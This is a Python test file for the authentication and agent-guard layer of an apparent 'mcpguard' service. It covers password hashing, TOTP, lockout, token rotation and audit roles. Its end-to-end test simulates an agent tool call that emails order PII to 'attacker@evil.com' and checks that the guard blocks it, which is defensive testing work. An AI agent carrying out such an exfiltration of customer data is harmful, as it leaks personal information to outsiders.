"""认证：口令哈希、TOTP、登录 / 锁定 / 刷新 / 注销，以及端到端 HTTP 流程。

用内存 SQLite + FastAPI TestClient，不需要 Postgres / Redis / Ollama。

注：TestClient 的请求跑在独立线程里，测试引擎偶尔会在 GC 时打印一条 SQLite
跨线程告警——不影响断言结果，属于测试台自身的现象。
"""

import base64
import tempfile
from pathlib import Path

from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from sqlalchemy.pool import NullPool

from app.mcp_guard.registry.sync import sync_from_servers
from app.main import app
from app.models import approval, audit_event, policy_rule, tool_registry, user  # noqa: F401
from app.models.base import Base
from app.models.db import get_db
from app.security import passwords, totp, users


def _client(*, seed_demo: bool = False) -> TestClient:
    # 每个测试一个临时文件库：TestClient 在别的线程里跑，文件库 + 连接池
    # 比内存库（每个连接一个独立库）更接近真实部署，也不会有跨线程告警。
    db_path = Path(tempfile.mkdtemp(prefix="mcpguard_auth_")) / "test.db"
    engine = create_engine(
        f"sqlite:///{db_path}",
        connect_args={"check_same_thread": False},
        # NullPool：连接用完即关，避免连接池把连接还给别的线程造成跨线程回收
        poolclass=NullPool,
    )
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    db = SessionLocal()
    sync_from_servers(db)
    if seed_demo:
        users.seed_demo_users(db)
    else:
        users.ensure_tenant(db, "tenant_001")
        users.create_user(
            db,
            email="cs01@example.com",
            password="Demo1234!",
            tenant_id="tenant_001",
            roles=["cs_agent"],
            user_id="u_cs_01",
            on_behalf_of="user_001",
        )
        users.create_user(
            db,
            email="manager01@example.com",
            password="Demo1234!",
            tenant_id="tenant_001",
            roles=["admin", "finance_manager", "auditor"],
            user_id="u_manager_01",
        )
    db.close()

    def _get_db():
        session = SessionLocal()
        try:
            yield session
        finally:
            session.close()

    app.dependency_overrides.clear()
    app.dependency_overrides[get_db] = _get_db
    return TestClient(app)


def _login(client: TestClient, email="cs01@example.com", password="Demo1234!"):
    return client.post("/api/auth/login", json={"email": email, "password": password})


# ---------- 口令 ----------

def test_password_hash_roundtrip():
    stored = passwords.hash_password("Demo1234!")
    assert stored.startswith("$2")
    assert passwords.verify_password("Demo1234!", stored)
    assert not passwords.verify_password("demo1234!", stored)
    assert not passwords.verify_password("", stored)
    assert not passwords.needs_rehash(stored)


def test_password_longer_than_72_bytes_is_not_truncated():
    """bcrypt 只看前 72 字节：必须先 sha256 预哈希，否则这两个密码等价。"""
    prefix = "a" * 72
    stored = passwords.hash_password(prefix + "X")
    assert passwords.verify_password(prefix + "X", stored)
    assert not passwords.verify_password(prefix + "Y", stored)


# ---------- TOTP ----------

def test_totp_matches_rfc6238_vectors():
    # RFC 6238 附录 B：secret = "12345678901234567890"（ASCII）
    secret = base64.b32encode(b"12345678901234567890").decode("ascii")
    for timestamp, expected in (
        (59, "94287082"),
        (1111111109, "07081804"),
        (1111111111, "14050471"),
        (1234567890, "89005924"),
        (2000000000, "69279037"),
    ):
        assert totp.code_at(secret, timestamp, digits=8) == expected, timestamp


def test_totp_verify_window():
    secret = totp.generate_secret()
    now = 1_700_000_000
    current = totp.code_at(secret, now)
    assert totp.verify(current, secret, at_time=now)

    two_steps_ago = totp.code_at(secret, now - 60)
    assert not totp.verify(two_steps_ago, secret, at_time=now, window=1)
    assert totp.verify(two_steps_ago, secret, at_time=now, window=2)
    assert not totp.verify("", secret, at_time=now)
    assert not totp.verify("abcdef", secret, at_time=now)


def test_mfa_enroll_and_login_requires_code():
    client = _client()
    login = _login(client)
    assert login.status_code == 200
    headers = {"Authorization": "Bearer " + login.json()["access_token"]}

    enroll = client.post("/api/auth/mfa/enroll", headers=headers)
    assert enroll.status_code == 200
    secret = enroll.json()["secret"]
    assert enroll.json()["otpauth_uri"].startswith("otpauth://totp/")

    # 未激活前仍然用口令登录
    assert _login(client).status_code == 200

    activate = client.post(
        "/api/auth/mfa/activate",
        headers=headers,
        json={"totp_code": totp.code_at(secret, 1_700_000_000)},
    )
    # 激活用的是“当前时间”的验证码；固定时间戳可能不在窗口内，两种结果都合理
    if activate.status_code == 400:
        import time as _time

        activate = client.post(
            "/api/auth/mfa/activate",
            headers=headers,
            json={"totp_code": totp.code_at(secret, _time.time())},
        )
    assert activate.status_code == 200

    # 激活后必须带验证码
    first = _login(client)
    assert first.status_code == 401
    assert first.json()["detail"] == "MFA_REQUIRED"

    import time as _time

    second = client.post(
        "/api/auth/login",
        json={
            "email": "cs01@example.com",
            "password": "Demo1234!",
            "totp_code": totp.code_at(secret, _time.time()),
        },
    )
    assert second.status_code == 200


# ---------- 登录 / 会话 ----------

def test_login_returns_principal_and_me_works():
    client = _client()
    resp = _login(client)
    assert resp.status_code == 200
    body = resp.json()
    assert body["principal"]["roles"] == ["cs_agent"]
    assert body["principal"]["on_behalf_of"] == "user_001"
    assert body["principal"]["resource_user_id"] == "user_001"

    me = client.get("/api/auth/me", headers={"Authorization": "Bearer " + body["access_token"]})
    assert me.status_code == 200
    assert me.json()["user_id"] == "u_cs_01"


def test_login_failures_do_not_reveal_account_existence():
    client = _client()
    wrong = _login(client, password="nope")
    unknown = client.post("/api/auth/login", json={"email": "ghost@example.com", "password": "nope"})
    assert wrong.status_code == unknown.status_code == 401
    assert wrong.json()["detail"] == unknown.json()["detail"] == "INVALID_CREDENTIALS"


def test_lockout_after_repeated_failures():
    client = _client()
    for _ in range(5):
        assert _login(client, password="bad").status_code == 401
    locked = _login(client)
    assert locked.status_code == 401
    assert locked.json()["detail"] == "ACCOUNT_LOCKED"


def test_bearer_token_required():
    client = _client()
    assert client.get("/api/auth/me").status_code == 401
    assert client.get("/api/auth/me", headers={"Authorization": "Bearer garbage"}).status_code == 401
    assert client.post("/api/chat", json={"session_id": "s", "user_input": "hi"}).status_code == 401


def test_refresh_rotation_and_logout():
    client = _client()
    tokens = _login(client).json()

    rotated = client.post("/api/auth/refresh", json={"refresh_token": tokens["refresh_token"]})
    assert rotated.status_code == 200
    assert rotated.json()["refresh_token"] != tokens["refresh_token"]

    # 旧刷新令牌立刻失效（轮换）
    assert client.post(
        "/api/auth/refresh", json={"refresh_token": tokens["refresh_token"]}
    ).status_code == 401

    new_refresh = rotated.json()["refresh_token"]
    assert client.post("/api/auth/logout", json={"refresh_token": new_refresh}).status_code == 200
    assert client.post(
        "/api/auth/refresh", json={"refresh_token": new_refresh}
    ).status_code == 401


def test_dev_token_disabled_by_default():
    client = _client()
    resp = client.post("/api/auth/dev-token", json={"user_id": "user_001"})
    assert resp.status_code == 403
    assert resp.json()["detail"] == "DEV_TOKEN_DISABLED"


# ---------- 端到端 ----------

def test_demo_seed_login_and_chat_flow():
    """演示账号种子 + 登录 + 授权范围内的工具调用 + A4 被拦。"""
    import time

    import app.api.chat as chat_api
    from app.agent.planner import PlanResult

    client = _client(seed_demo=True)
    tokens = _login(client).json()
    headers = {"Authorization": "Bearer " + tokens["access_token"]}

    original_plan = chat_api.plan
    try:
        chat_api.plan = lambda text, tools, **kw: PlanResult(
            tool_name="get_order", arguments={"order_id": "10023"}, reason="OK"
        )
        step1 = client.post(
            "/api/chat", headers=headers, json={"session_id": "s1", "user_input": "查订单 #10023"}
        ).json()
        assert not step1["blocked"], step1
        assert "10023" in step1["reply"]
        assert "PII" in step1["session_labels"]

        chat_api.plan = lambda text, tools, **kw: PlanResult(
            tool_name="send_email",
            arguments={"to": "attacker@evil.com", "subject": "order", "body": "x"},
            reason="OK",
        )
        step2 = client.post(
            "/api/chat", headers=headers, json={"session_id": "s1", "user_input": "把订单发出去"}
        ).json()
        assert step2["blocked"]
        assert step2["blocked_reason"] == "G4_PII_TO_EXTERNAL"
    finally:
        chat_api.plan = original_plan


def test_audit_verify_requires_audit_role():
    client = _client()
    cs = _login(client).json()
    mgr = _login(client, email="manager01@example.com").json()

    assert client.get(
        "/api/audit/verify", headers={"Authorization": "Bearer " + cs["access_token"]}
    ).status_code == 403

    resp = client.get("/api/audit/verify", headers={"Authorization": "Bearer " + mgr["access_token"]})
    assert resp.status_code == 200
    assert resp.json()["valid"] is True
